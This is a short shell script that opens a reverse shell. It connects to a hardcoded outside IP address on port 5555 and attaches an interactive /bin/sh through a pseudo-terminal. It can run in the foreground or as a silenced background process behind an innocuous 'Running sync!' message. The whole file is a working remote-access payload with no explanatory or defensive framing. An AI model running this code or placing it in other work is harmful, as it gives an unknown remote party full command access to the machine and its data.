#!/bin/sh

IP="103.150.196.198"
PORT=5555
SYNC=true

if [ "$SYNC" = true ]; then
  echo Running sync!
  python3 -c "import socket,subprocess,os,pty,signal,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PORT));
master,slave=pty.openpty();
p=subprocess.Popen(['/bin/sh','-i'],stdin=slave,stdout=slave,stderr=slave,preexec_fn=os.setsid);
os.close(slave);
import select;
try:
    while True:
        r,_,_=select.select([s,master],[],[]);
        if s in r:
            d=s.recv(4096);
            if len(d)==0:
                os.killpg(os.getpgid(p.pid),signal.SIGKILL);
                sys.exit(0);
            os.write(master,d);
        if master in r:
            d=os.read(master,4096);
            if len(d)==0:
                break;
            s.send(d);
except:
    pass;
finally:
    try:
        os.killpg(os.getpgid(p.pid),signal.SIGKILL);
    except:
        pass;
    sys.exit(0)"
  exit 0
else
  echo Running async!
  (
    python3 -c "import socket,subprocess,os,pty,signal,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PORT));
master,slave=pty.openpty();
p=subprocess.Popen(['/bin/sh','-i'],stdin=slave,stdout=slave,stderr=slave,preexec_fn=os.setsid);
os.close(slave);
import select;
try:
    while True:
        r,_,_=select.select([s,master],[],[]);
        if s in r:
            d=s.recv(4096);
            if len(d)==0:
                os.killpg(os.getpgid(p.pid),signal.SIGKILL);
                sys.exit(0);
            os.write(master,d);
        if master in r:
            d=os.read(master,4096);
            if len(d)==0:
                break;
            s.send(d);
except:
    pass;
finally:
    try:
        os.killpg(os.getpgid(p.pid),signal.SIGKILL);
    except:
        pass;
    sys.exit(0)" &
  ) >/dev/null 2>&1
  exit 0
fi